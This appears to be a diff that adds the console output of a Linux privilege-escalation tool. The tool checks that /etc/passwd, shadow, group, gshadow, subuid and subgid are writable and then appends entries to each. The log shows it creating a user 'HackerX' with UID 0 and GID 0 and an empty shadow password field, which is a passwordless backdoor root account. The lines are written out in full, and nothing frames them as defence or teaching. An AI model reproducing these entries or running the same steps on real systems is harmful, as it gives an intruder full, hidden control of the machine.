@@ -1,0 +1,49 @@
+Checking for weak files
+Is passwd writable?  True
+Is shadow writable?  True
+Is group writable?  True
+Is gshadow writable?  True
+Is subuid writable?  True
+Is subgid writable?  True
+======================================================================
+WRITING INTO SUBUID AND SUBGID FILE
+Reading subuid file contents...
+Analyzing file contents...
+HackerX:427680:65536
+
+Appending new subuid to the file...
+subuid updated! successfully!!
+Appending new subgid to the file...
+subgid updated successfully!!!
+======================================================================
+WRITING INTO GROUP FILE
+Reading group file contents...
+Analyzing group file contents...
+HackerX:x:65540:
+
+Appending new group to the file...
+group updated! successfully!!
+======================================================================
+WRITING INTO GSHADOW FILE
+HackerX:!::
+
+Appending to the GSHADOW file...
+gshadow updated! successfully!!
+======================================================================
+WRITING INTO PASSWD FILE
+Reading passwd file contents...
+Analyzing passwd file contents...
+65535
+HackerX:x:0:0::/home/HackerX:/bin/sh
+
+Appending to the PASSWD file...
+passwd updated! successfully!!
+======================================================================
+WRITING INTO SHADOW FILE
+HackerX::19485:0:99999:10:::
+
+Appending to the SHADOW file...
+shadow updated! successfully!!
+======================================================================
+New user created successfully!!! Name:  HackerX
+======================================================================
